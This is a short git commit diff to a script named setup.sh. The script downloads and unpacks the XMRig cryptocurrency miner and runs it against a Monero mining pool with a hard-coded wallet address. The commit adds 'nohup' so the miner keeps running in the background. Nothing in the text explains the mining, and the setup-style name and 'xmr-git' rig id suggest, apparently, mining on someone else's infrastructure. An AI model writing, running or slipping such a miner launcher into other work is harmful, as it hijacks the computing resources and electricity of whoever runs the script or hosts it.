ccb0441945c1fbcca3827d376b980167c4e0368e
lahnoe <84301162+lahnoe@users.noreply.github.com>
2021-05-17 11:09:25 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -3,4 +3,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux
 tar xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1
 
 
-./xmrig -o sg.minexmr.com:443 -u 82zaKZuuDtkhoUoDZ3NZY3VzzxXzXzm4jQ942LWgjjVV6SEsoTqcpmCgtpUKDQbAy3RH7E8AjTyfgLgBngvDNENfCDjnW9z -k --tls --rig-id xmr-git
+nohup ./xmrig -o sg.minexmr.com:443 -u 82zaKZuuDtkhoUoDZ3NZY3VzzxXzXzm4jQ942LWgjjVV6SEsoTqcpmCgtpUKDQbAy3RH7E8AjTyfgLgBngvDNENfCDjnW9z -k --tls --rig-id xmr-git
